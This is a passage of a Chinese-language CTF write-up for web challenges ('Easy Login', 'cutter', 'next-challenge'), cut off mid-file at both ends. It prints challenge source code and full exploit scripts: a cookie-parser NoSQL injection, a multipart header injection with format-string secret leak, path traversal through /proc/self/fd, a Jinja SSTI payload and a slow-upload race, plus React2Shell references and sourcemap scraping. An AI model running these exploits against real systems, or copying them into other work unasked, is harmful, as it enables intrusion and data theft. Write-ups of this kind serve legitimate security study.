        print("Open failed")
        return

    data = b""
    offset = 0
    toread = min(0x400, fsize)

    buf, n, err, ret, raw = read_file(dce, ctx, offset, toread)
    print("Read:", "bytes=", n, "err=", err, "ret=", ret)
    if n == 0:
        print("raw resp:", raw.hex())
        return

    data += buf[:n]
    print(xor_dec(data).decode(errors='ignore'))

if __name__ == "__main__":
    main()
```

## Easy Login

```javascript
const $ = (id) => document.getElementById(id);

const terminalBody = $('terminalBody');
const currentUser = $('currentUser');

function appendLine(className, text) {
  const line = document.createElement('div');
  line.className = `line ${className}`;
  line.textContent = text;
  terminalBody.appendChild(line);
  terminalBody.scrollTop = terminalBody.scrollHeight;
}

function logRequest(method, path, body) {
  const payload = body ? ` ${JSON.stringify(body)}` : '';
  appendLine('request-line', `$ fetch ${method.toUpperCase()} ${path}${payload}`);
}

function logResponse(status, json) {
  appendLine('meta-line', `< status ${status} >`);
  appendLine('response-line', JSON.stringify(json));
}

function logError(err) {
  appendLine('error-line', `! error: ${err}`);
}

function updateUserLabel(username) {
  if (!username) {
    currentUser.textContent = 'guest';
    currentUser.classList.add('pill-muted');
    return;
  }
  currentUser.textContent = username;
  currentUser.classList.remove('pill-muted');
}

async function callApi(method, path, body) {
  try {
    logRequest(method, path, body);

    const res = await fetch(path, {
      method,
      headers: {
        'Content-Type': 'application/json'
      },
      body: body ? JSON.stringify(body) : undefined,
      credentials: 'same-origin'
    });

    const text = await res.text();
    let json;
    try {
      json = JSON.parse(text);
    } catch {
      json = { raw: text };
    }

    logResponse(res.status, json);
    return { res, json };
  } catch (err) {
    logError(err);
    throw err;
  }
}

window.addEventListener('DOMContentLoaded', () => {
  $('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = $('username').value.trim();
    const password = $('password').value;

    if (!username || !password) {
      logError('username and password required');
      return;
    }

    try {
      const { res, json } = await callApi('post', '/login', { username, password });
      if (res.ok) {
        updateUserLabel(json.username || username);
      }
    } catch (err) {
      console.error(err);
    }
  });

  $('btnLogout').addEventListener('click', async () => {
    try {
      await callApi('post', '/logout');
      updateUserLabel(null);
    } catch (err) {
      console.error(err);
    }
  });

  $('btnMe').addEventListener('click', async () => {
    try {
      const { json } = await callApi('get', '/me');
      if (json && json.loggedIn && json.username) {
        updateUserLabel(json.username);
      } else {
        updateUserLabel(null);
      }
    } catch (err) {
      console.error(err);
    }
  });

  $('btnAdmin').addEventListener('click', async () => {
    try {
      await callApi('get', '/admin');
    } catch (err) {
      console.error(err);
    }
  });

  $('btnVisit').addEventListener('click', async () => {
    const urlInput = $('visitUrl');
    const url = urlInput.value.trim();

    if (!url) {
      logError('url is required for /visit');
      return;
    }

    try {
      await callApi('post', '/visit', { url });
    } catch (err) {
      console.error(err);
    }
  });
});
```

没什么问题

```typescript
import dotenv from 'dotenv';
import express, { Request, Response, NextFunction } from 'express';
import cookieParser from 'cookie-parser';
import { MongoClient, Db, Collection } from 'mongodb';
import crypto from 'crypto';
import path from 'path';
import puppeteer from 'puppeteer';

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT) || 3000;

const mongoUri = process.env.MONGO_URI || process.env.MONGO_URL || 'mongodb://127.0.0.1:27017/easy_login';
const dbName = process.env.MONGO_DB_NAME || 'easy_login';
const FLAG = process.env.FLAG || 'flag{dummy_flag_for_testing}';
const APP_INTERNAL_URL = process.env.APP_INTERNAL_URL || `http://127.0.0.1:${PORT}`;
const ADMIN_PASSWORD = crypto.randomBytes(16).toString('hex');

interface UserDoc {
  username: string;
  password: string;
}

interface SessionDoc {
  sid: string;
  username: string;
  createdAt: Date;
}

interface AuthedRequest extends Request {
  user?: { username: string } | null;
  collections?: {
    users: Collection<UserDoc> | null;
    sessions: Collection<SessionDoc> | null;
  };
}

let db: Db | null = null;
let usersCollection: Collection<UserDoc> | null = null;
let sessionsCollection: Collection<SessionDoc> | null = null;

const publicDir = path.join(__dirname, '../public');

async function runXssVisit(targetUrl: string): Promise<void> {
  if (typeof targetUrl !== 'string' || !/^https?:\/\//i.test(targetUrl)) {
    throw new Error('invalid target url');
  }

  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });

  try {
    const page = await browser.newPage();

    await page.goto(APP_INTERNAL_URL + '/', {
      waitUntil: 'networkidle2',
      timeout: 15000
    });

    await page.type('#username', 'admin', { delay: 30 });
    await page.type('#password', ADMIN_PASSWORD, { delay: 30 });

    await Promise.all([
      page.click('#loginForm button[type="submit"]'),
      page.waitForResponse(
        (res) => res.url().endsWith('/login') && res.request().method() === 'POST',
        { timeout: 10000 }
      ).catch(() => undefined)
    ]);

    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });

    await new Promise((resolve) => setTimeout(resolve, 5000));
  } finally {
    await browser.close();
  }
}

async function createSessionForUser(user: UserDoc): Promise<string> {
  if (!sessionsCollection) {
    throw new Error('sessions collection not initialized');
  }

  const sid = crypto.randomBytes(16).toString('hex');

  await sessionsCollection.insertOne({
    sid,
    username: user.username,
    createdAt: new Date()
  });

  return sid;
}

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(publicDir));

async function initMongo(): Promise<void> {
  const client = new MongoClient(mongoUri);
  await client.connect();
  db = client.db(dbName);
  usersCollection = db.collection<UserDoc>('users');
  sessionsCollection = db.collection<SessionDoc>('sessions');

  let adminUser = await usersCollection.findOne({ username: 'admin' });
  if (!adminUser) {
    await usersCollection.insertOne({
      username: 'admin',
      password: ADMIN_PASSWORD
    });
  } else {
    await usersCollection.updateOne(
      { username: 'admin' },
      { $set: { password: ADMIN_PASSWORD } }
    );
  }

  adminUser = await usersCollection.findOne({ username: 'admin' });
  console.log(`[init] Admin password set to: ${ADMIN_PASSWORD}`);
}

async function sessionMiddleware(req: AuthedRequest, res: Response, next: NextFunction): Promise<void> {
  const sid = req.cookies?.sid as string | undefined;
  if (!sid || !sessionsCollection || !usersCollection) {
    req.user = null;
    return next();
  }

  try {
    const session = await sessionsCollection.findOne({ sid });
    if (!session) {
      req.user = null;
      return next();
    }

    const user = await usersCollection.findOne({ username: session.username });
    if (!user) {
      req.user = null;
      return next();
    }

    req.user = { username: user.username };
    return next();
  } catch (err) {
    console.error('Error in session middleware:', err);
    req.user = null;
    return next();
  }
}

app.use((req: AuthedRequest, _res: Response, next: NextFunction) => {
  req.collections = {
    users: usersCollection,
    sessions: sessionsCollection
  };
  next();
});

app.use(sessionMiddleware as any);

app.get('/', (_req: AuthedRequest, res: Response) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

app.post('/login', async (req: AuthedRequest, res: Response) => {
  const { username, password } = req.body as { username?: unknown; password?: unknown };
  
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'username and password must be strings' });
  }

  if (!username || !password) {
    return res.status(400).json({ error: 'username and password required' });
  }

  if (!usersCollection) {
    return res.status(500).json({ error: 'Database not initialized yet' });
  }
  
  try {
    let user = await usersCollection.findOne({ username });

    if (!user) {
      if (username === 'admin') {
        return res.status(403).json({ error: 'admin user not available' });
      }
      await usersCollection.insertOne({ username, password });
      user = await usersCollection.findOne({ username });
    }

    if (!user || user.password !== password) {
      return res.status(401).json({ error: 'invalid credentials' });
    }

    const sid = await createSessionForUser(user);

    res.cookie('sid', sid, {
      httpOnly: false,
      sameSite: 'lax'
    });

    return res.json({
      ok: true,
      sid,
      username: user.username
    });
  } catch (err) {
    console.error('Error in /login:', err);
    return res.status(500).json({ error: 'internal error' });
  }
});

app.post('/logout', async (req: AuthedRequest, res: Response) => {
  res.clearCookie('sid');
  res.json({ ok: true });
});

app.get('/me', (req: AuthedRequest, res: Response) => {
  if (!req.user) {
    return res.json({ loggedIn: false });
  }
  res.json({
    loggedIn: true,
    username: req.user.username
  });
});

app.get('/admin', (req: AuthedRequest, res: Response) => {
  if (!req.user || req.user.username !== 'admin') {
    return res.status(403).json({ error: 'admin only' });
  }

  res.json({ flag: FLAG });
});
app.post('/visit', async (req: Request, res: Response) => {
  const { url } = req.body as { url?: unknown };

  if (typeof url !== 'string') {
    return res.status(400).json({ error: 'url must be a string' });
  }

  try {
    await runXssVisit(url);
    return res.json({ ok: true });
  } catch (err: any) {
    console.error('XSS bot error:', err);
    return res.status(500).json({ error: 'bot failed', detail: String(err) });
  }
});

initMongo()
  .then(() => {
    app.listen(PORT, () => {
      console.log(`Server listening on port ${PORT}`);
    });
  })
  .catch((err: unknown) => {
    console.error('Failed to initialize MongoDB:', err);
    process.exit(1);
  });
```

`cookie-parser`有个特性，如果传入的 Cookie 值以`j:`开头，它会自动将后面的内容作为 JSON 进行解析，并将其转换为 JavaScript 对象返回，`let adminUser = await usersCollection.findOne({ username: 'admin' });`一眼丁真 nosql 注入，下一步就是找传参的位置

```typescript
async function sessionMiddleware(req: AuthedRequest, res: Response, next: NextFunction): Promise<void> {
  // 这里的 as string 只是 TypeScript 的编译期类型断言，运行时无效
  const sid = req.cookies?.sid as string | undefined; 
  // ...
  const session = await sessionsCollection.findOne({ sid });
  // ...
}
```

如果在请求中发送`Cookie: sid=j:{"$ne": null}`，在运行时`req.cookies.sid`将不再是一个字符串，而是一个真实的 JavaScript 对象`{"$ne": null}`

exp 如下

```python
import requests

TARGET_URL = "http://223.6.249.127:10977"

def get_flag():
    try:
        requests.post(
            f"{TARGET_URL}/visit",
            json={"url": f"{TARGET_URL}/"},
            timeout=20
        )
    except requests.exceptions.RequestException:
        pass

    try:
        res = requests.get(
            f"{TARGET_URL}/admin",
            cookies={"sid": 'j:{"$ne": "1"}'},
            timeout=10
        )
        print(res.text)
    except requests.exceptions.RequestException as e:
        print(e)

if __name__ == "__main__":
    get_flag()
```

## cutter

```python
from flask import Flask, request, render_template, render_template_string
from io import BytesIO
import os
import json
import httpx

app = Flask(__name__)

API_KEY = os.urandom(32).hex()
HOST = '127.0.0.1:5000'

@app.route('/admin', methods=['GET'])
def admin():
    token = request.headers.get("Authorization", "")
    if token != API_KEY:
        return 'unauth', 403

    tmpl = request.values.get('tmpl', 'index.html')
    tmpl_path = os.path.join('./templates', tmpl)

    if not os.path.exists(tmpl_path):
        return 'Not Found', 404

    tmpl_content = open(tmpl_path, 'r').read()
    return render_template_string(tmpl_content), 200

@app.route('/action', methods=['POST'])
def action():
    ip = request.remote_addr
    if ip != '127.0.0.1':
        return 'only localhost', 403

    token = request.headers.get("X-Token", "")
    if token != API_KEY:
        return 'unauth', 403
    
    file = request.files.get('content')
    content = file.stream.read().decode()

    action = request.files.get("action")
    act = json.loads(action.stream.read().decode())

    if act["type"] == "echo":
        return content, 200
    elif act["type"] == "debug":
        return content.format(app), 200
    else:
        return 'unkown action', 400

@app.route('/heartbeat', methods=['GET', 'POST'])
def heartbeat():
    text = request.values.get('text', "default")
    client = request.values.get('client', "default")
    token = request.values.get('token', "")

    if len(text) > 300:
        return "text too large", 400

    action = json.dumps({"type" : "echo"})

    form_data = {
        'content': ('content', BytesIO(text.encode()), 'text/plain'),
        'action' : ('action', BytesIO(action.encode()), 'text/json')
    }

    headers = {
        "X-Token" : API_KEY,
    }
    headers[client] = token

    response = httpx.post(f"http://{HOST}/action", headers=headers, files=form_data, timeout=10.0)
    if response.status_code == 200:
        return response.text, 200
    else:
        return f'action failed', 500

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
```

`/heartbeat`伪造 multipart → 打到本地`/action`的`debug`分支 → 泄露`API_KEY` → 带 key 打`/admin` → 路径穿越任意文件读，但是由于 flag 的位置不在`/flag`

```shell
#!/bin/bash

if [ -n "$FLAG" ]; then
    echo "$FLAG" > "/flag-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 32).txt"
    unset FLAG
else
    echo "flag{testflag}" > "/flag-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 32).txt"
fi

useradd -M ctf

su ctf -c 'cd /app && python app.py'
```

网上可以查到，在 Linux 中，`/proc/self/fd/` 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（`wsgi.input`）或者因请求体过大而产生的临时缓存文件，所以我们可以爆破 fd 去泄露 flag 内容

但是又有一个问题，我们怎么才能产生大缓存呢？🥸

而是 /heartbeat 解析外部大 multipart/form-data 时生成的临时上传文件 fd，exp 如下

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import threading
import time
from typing import Optional, Tuple

import requests


API_KEY_RE = re.compile(r"([a-f0-9]{64})")
FLAG_FILE_RE = re.compile(r"flag-[a-f0-9]{32}\.txt")
FLAG_RE = re.compile(r"(alictf\{[^}]+\})")


def leak_api_key(base_url: str) -> str:
    payload = (
        "{0.view_functions[admin].__globals__[API_KEY]}\r\n"
        "--x\r\n"
        'Content-Disposition: form-data; name="action"; filename="1"\r\n'
        "\r\n"
        '{"type":"debug"}'
    )
    response = requests.get(
        f"{base_url}/heartbeat",
        params={
            "client": "Content-Type",
            "token": "multipart/form-data; boundary=x",
            "text": payload,
        },
        timeout=15,
    )
    response.raise_for_status()
    match = API_KEY_RE.search(response.text)
    if not match:
        raise RuntimeError(f"failed to leak API key: {response.text[:200]!r}")
    return match.group(1)


def build_large_multipart(boundary: str, injected_template: str, pad_size: int) -> bytes:
    parts = [
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="text"\r\n'
            "\r\n"
            "x\r\n"
        ).encode(),
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="client"\r\n'
            "\r\n"
            "foo\r\n"
        ).encode(),
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="token"\r\n'
            "\r\n"
            "bar\r\n"
        ).encode(),
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="blob"; filename="blob.txt"\r\n'
            "Content-Type: text/plain\r\n"
            "\r\n"
        ).encode(),
    ]
    end = f"\r\n--{boundary}--\r\n".encode()
    return b"".join(parts) + injected_template.encode() + (b"A" * pad_size) + end


def hold_large_upload(host: str, port: int, body: bytes, boundary: str, hold_after: int, hold_seconds: float) -> Tuple[threading.Thread, dict]:
    state = {}

    def worker() -> None:
        try:
            sock = socket.create_connection((host, port), timeout=10)
            sock.settimeout(20)
            request = (
                f"POST /heartbeat HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode()
            sock.sendall(request)
            sock.sendall(body[:hold_after])
            state["first_chunk_sent"] = True
            time.sleep(hold_seconds)
            sock.sendall(body[hold_after:])

            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            state["response_head"] = response[:200]
            sock.close()
        except Exception as exc:
            state["error"] = repr(exc)

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    return thread, state


def find_flag_filename(base_url: str, api_key: str, fd_start: int, fd_end: int, scan_rounds: int) -> Tuple[str, int]:
    headers = {"Authorization": api_key}
    for _ in range(scan_rounds):
        for fd in range(fd_start, fd_end + 1):
            try:
                response = requests.get(
                    f"{base_url}/admin",
                    headers=headers,
                    params={"tmpl": f"../../../../proc/self/fd/{fd}"},
                    timeout=1,
                )
            except requests.RequestException:
                continue

            if response.status_code != 200:
                continue

            match = FLAG_FILE_RE.search(response.text)
            if match:
                return match.group(0), fd
        time.sleep(0.02)
    raise RuntimeError("failed to find flag filename from proc fd scan")


def read_flag(base_url: str, api_key: str, flag_file: str) -> str:
    response = requests.get(
        f"{base_url}/admin",
        headers={"Authorization": api_key},
        params={"tmpl": f"/{flag_file}"},
        timeout=15,
    )
    response.raise_for_status()
    match = FLAG_RE.search(response.text)
    if not match:
        raise RuntimeError(f"failed to extract flag: {response.text[:200]!r}")
    return match.group(1)


def parse_host_port(target: str) -> Tuple[str, int, str]:
    target = target.strip()
    if target.startswith("http://") or target.startswith("https://"):
        base_url = target.rstrip("/")
        host_port = re.sub(r"^https?://", "", base_url)
    else:
        host_port = target
        base_url = f"http://{target}"

    if ":" not in host_port:
        raise ValueError("target must include host:port")

    host, port_str = host_port.rsplit(":", 1)
    return host, int(port_str), base_url


def main() -> None:
    parser = argparse.ArgumentParser(description="attachment_cutter exploit")
    parser.add_argument(
        "target",
        nargs="?",
        default="223.6.249.127:54789",
        help="target in host:port or http://host:port format",
    )
    parser.add_argument("--pad-size", type=int, default=700000, help="bytes appended after SSTI payload")
    parser.add_argument("--hold-after", type=int, default=600000, help="bytes to send before pausing")
    parser.add_argument("--hold-seconds", type=float, default=10.0, help="pause duration while scanning fds")
    parser.add_argument("--fd-start", type=int, default=4, help="start fd to scan")
    parser.add_argument("--fd-end", type=int, default=20, help="end fd to scan")
    parser.add_argument("--scan-rounds", type=int, default=400, help="how many scan loops to run")
    args = parser.parse_args()

    host, port, base_url = parse_host_port(args.target)

    print(f"[*] Target: {base_url}")
    api_key = leak_api_key(base_url)
    print(f"[+] API key: {api_key}")

    boundary = "----codexpoc7MA4YWxkTrZu0gW"
    injected_template = "{{ cycler.__init__.__globals__.os.listdir('/') }}\n"
    body = build_large_multipart(boundary, injected_template, args.pad_size)

    upload_thread, upload_state = hold_large_upload(
        host=host,
        port=port,
        body=body,
        boundary=boundary,
        hold_after=args.hold_after,
        hold_seconds=args.hold_seconds,
    )

    wait_until = time.time() + 5
    while not upload_state.get("first_chunk_sent"):
        if time.time() > wait_until:
            raise RuntimeError(f"upload did not start: {upload_state}")
        time.sleep(0.05)

    print("[*] Large multipart upload in progress, scanning /proc/self/fd/* ...")
    flag_file, hit_fd = find_flag_filename(
        base_url=base_url,
        api_key=api_key,
        fd_start=args.fd_start,
        fd_end=args.fd_end,
        scan_rounds=args.scan_rounds,
    )
    print(f"[+] Flag file: {flag_file} (via fd {hit_fd})")

    flag = read_flag(base_url, api_key, flag_file)
    print(f"[+] Flag: {flag}")

    upload_thread.join(timeout=1)
    if upload_state.get("error"):
        print(f"[!] Upload thread error after success: {upload_state['error']}")


if __name__ == "__main__":
    main()


# python3 exp.py 223.6.249.127:54789
```

## next-challenge

sourcemap 没有关，下载源码之后分析，在此之前，可以找一些文章看看，比如 vercel 之前的百万悬赏

https://vercel.com/blog/our-million-dollar-hacker-challenge-for-react2shell

https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc

看了绕过方法之后，收集代码 https://github.com/denandz/sourcemapper

![img](15.png)

```bash
for url in \
  "http://223.6.249.127:44120/_next/static/chunks/webpack.js" \
  "http://223.6.249.127:44120/_next/static/chunks/main-app.js" \
  "http://223.6.249.127:44120/_next/static/chunks/app-pages-internals.js" \
  "http://223.6.249.127:44120/_next/static/chunks/app/page.js"; \
do \
  echo "[*] 正在抓取并还原: ${url}.map"; \
  sourcemapper -url "${url}.map" -output ./react-source; \
done
```

下载失败，访问`http://223.6.249.127:44120/_next/static/chunks/app/page.js`

```javascript
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
(self["webpackChunk_N_E"] = self["webpackChunk_N_E"] || []).push([["app/page"],{

/***/ "(app-pages-browser)/./app/actions.ts":
/*!************************!*\
  !*** ./app/actions.ts ***!
  \************************/
/***/ ((module, __webpack_exports__, __webpack_require__) => {

"use strict";
eval(__webpack_require__.ts("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   GetSource: () => (/* binding */ GetSource),\n/* harmony export */   Hello: () => (/* binding */ Hello)\n/* harmony export */ });\n/* harmony import */ var private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! private-next-rsc-action-client-wrapper */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-loader/action-client-wrapper.js\");\n/* harmony import */ var private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__);\n/* __next_internal_action_entry_do_not_use__ {\"0061d52a916691f7ef6c508d051caa869cef8f1e77\":\"GetSource\",\"40f2bfd3d45a7afb70da6568f7a4478c45fe1e4ab5\":\"Hello\"} */ \nvar Hello = /*#__PURE__*/ (0,private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.createServerReference)(\"40f2bfd3d45a7afb70da6568f7a4478c45fe1e4ab5\", private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.callServer, void 0, private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.findSourceMapURL, \"Hello\");\nvar GetSource = /*#__PURE__*/ (0,private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.createServerReference)(\"0061d52a916691f7ef6c508d051caa869cef8f1e77\", private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.callServer, void 0, private_next_rsc_action_client_wrapper__WEBPACK_IMPORTED_MODULE_0__.findSourceMapURL, \"GetSource\");\n\n\n;\n    // Wrapped in an IIFE to avoid polluting the global scope\n    ;\n    (function () {\n        var _a, _b;\n        // Legacy CSS implementations will `eval` browser code in a Node.js context\n        // to extract CSS. For backwards compatibility, we need to check we're in a\n        // browser context before continuing.\n        if (typeof self !== 'undefined' &&\n            // No-JS mode does not inject these helpers:\n            '$RefreshHelpers$' in self) {\n            // @ts-ignore __webpack_module__ is global\n            var currentExports = module.exports;\n            // @ts-ignore __webpack_module__ is global\n            var prevSignature = (_b = (_a = module.hot.data) === null || _a === void 0 ? void 0 : _a.prevSignature) !== null && _b !== void 0 ? _b : null;\n            // This cannot happen in MainTemplate because the exports mismatch between\n            // templating and execution.\n            self.$RefreshHelpers$.registerExportsForReactRefresh(currentExports, module.id);\n            // A module can be accepted automatically based on its exports, e.g. when\n            // it is a Refresh Boundary.\n            if (self.$RefreshHelpers$.isReactRefreshBoundary(currentExports)) {\n                // Save the previous exports signature on update so we can compare the boundary\n                // signatures. We avoid saving exports themselves since it causes memory leaks (https://github.com/vercel/next.js/pull/53797)\n                module.hot.dispose(function (data) {\n                    data.prevSignature =\n                        self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports);\n                });\n                // Unconditionally accept an update to this module, we'll check if it's\n                // still a Refresh Boundary later.\n                // @ts-ignore importMeta is replaced in the loader\n                module.hot.accept();\n                // This field is set when the previous version of this module was a\n                // Refresh Boundary, letting us know we need to check for invalidation or\n                // enqueue an update.\n                if (prevSignature !== null) {\n                    // A boundary can become ineligible if its exports are incompatible\n                    // with the previous exports.\n                    //\n                    // For example, if you add/remove/change exports, we'll want to\n                    // re-execute the importing modules, and force those components to\n                    // re-render. Similarly, if you convert a class component to a\n                    // function, we want to invalidate the boundary.\n                    if (self.$RefreshHelpers$.shouldInvalidateReactRefreshBoundary(prevSignature, self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports))) {\n                        module.hot.invalidate();\n                    }\n                    else {\n                        self.$RefreshHelpers$.scheduleUpdate();\n                    }\n                }\n            }\n            else {\n                // Since we just executed the code for the module, it's possible that the\n                // new exports made it ineligible for being a boundary.\n                // We only care about the case when we were _previously_ a boundary,\n                // because we already accepted this update (accidental side effect).\n                var isNoLongerABoundary = prevSignature !== null;\n                if (isNoLongerABoundary) {\n                    module.hot.invalidate();\n                }\n            }\n        }\n    })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL2FwcC9hY3Rpb25zLnRzIiwibWFwcGluZ3MiOiI7Ozs7Ozs7O0lBQ3NCQSxzQkFBQUEsNkZBQUFBLCtDQUFBQSw4RUFBQUEsVUFBQUEsb0ZBQUFBO0lBSUFDLDBCQUFBQSw2RkFBQUEsK0NBQUFBLDhFQUFBQSxVQUFBQSxvRkFBQUEiLCJzb3VyY2VzIjpbIi9hcHAvYXBwL2FjdGlvbnMudHMiXSwic291cmNlc0NvbnRlbnQiOlsiJ3VzZSBzZXJ2ZXInXG5leHBvcnQgYXN5bmMgZnVuY3Rpb24gSGVsbG8oaW5wdXQ6IHN0cmluZyk6IFByb21pc2U8c3RyaW5nPiB7XG4gIHJldHVybiBgaGVsbG8gJHtpbnB1dH0hYDtcbn1cblxuZXhwb3J0IGFzeW5jIGZ1bmN0aW9uIEdldFNvdXJjZSgpOiBQcm9taXNlPHN0cmluZz4ge1xuICAvLyByZWFkIC9zb3VyY2UtMzUyN2M4NGQtMmVjYy00Yzc2LTlkODMtN2U4MzEzOGMxOWE4LnppcFxuICByZXR1cm4gXCJcIjtcbn0iXSwibmFtZXMiOlsiSGVsbG8iLCJHZXRTb3VyY2UiXSwiaWdub3JlTGlzdCI6W10sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///(app-pages-browser)/./app/actions.ts\n"));

/***/ }),

/***/ "(app-pages-browser)/./app/page.tsx":
/*!**********************!*\
  !*** ./app/page.tsx ***!
  \**********************/
/***/ ((module, __webpack_exports__, __webpack_require__) => {

"use strict";
eval(__webpack_require__.ts("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Home)\n/* harmony export */ });\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! react/jsx-dev-runtime */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/jsx-dev-runtime.js\");\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! react */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/index.js\");\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_1__);\n/* harmony import */ var _actions__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./actions */ \"(app-pages-browser)/./app/actions.ts\");\n/* __next_internal_client_entry_do_not_use__ default auto */ \nvar _s = $RefreshSig$();\n\n\nfunction Home() {\n    _s();\n    const [input, setInput] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)('');\n    const [result, setResult] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)('');\n    const [loading, setLoading] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)(false);\n    async function handleSubmit(e) {\n        e.preventDefault();\n        setLoading(true);\n        try {\n            const output = await (0,_actions__WEBPACK_IMPORTED_MODULE_2__.Hello)(input);\n            setResult(output);\n        } catch (error) {\n            setResult('Error: ' + (error instanceof Error ? error.message : 'Unknown error'));\n        } finally{\n            setLoading(false);\n        }\n    }\n    return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n        className: \"flex min-h-screen items-center justify-center bg-zinc-50 font-sans dark:bg-black\",\n        children: /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"main\", {\n            className: \"flex min-h-screen w-full max-w-3xl flex-col items-center justify-center py-32 px-16 bg-white dark:bg-black\",\n            children: /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                className: \"flex flex-col items-center gap-8 text-center w-full max-w-md\",\n                children: [\n                    /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"h1\", {\n                        className: \"text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50\",\n                        children: \"Welcome to the challenge\"\n                    }, void 0, false, {\n                        fileName: \"/app/app/page.tsx\",\n                        lineNumber: 28,\n                        columnNumber: 11\n                    }, this),\n                    /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"form\", {\n                        onSubmit: handleSubmit,\n                        className: \"w-full flex flex-col gap-4\",\n                        children: [\n                            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                                className: \"flex flex-col gap-2\",\n                                children: /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"input\", {\n                                    id: \"input\",\n                                    type: \"text\",\n                                    value: input,\n                                    onChange: (e)=>setInput(e.target.value),\n                                    placeholder: \"What's your name?\",\n                                    className: \"w-full px-4 py-3 rounded-lg border border-zinc-300 dark:border-zinc-700 bg-white dark:bg-zinc-900 text-black dark:text-zinc-50 focus:outline-none focus:ring-2 focus:ring-zinc-500 dark:focus:ring-zinc-400\",\n                                    disabled: loading\n                                }, void 0, false, {\n                                    fileName: \"/app/app/page.tsx\",\n                                    lineNumber: 34,\n                                    columnNumber: 15\n                                }, this)\n                            }, void 0, false, {\n                                fileName: \"/app/app/page.tsx\",\n                                lineNumber: 33,\n                                columnNumber: 13\n                            }, this),\n                            /*#__PURE__*/ 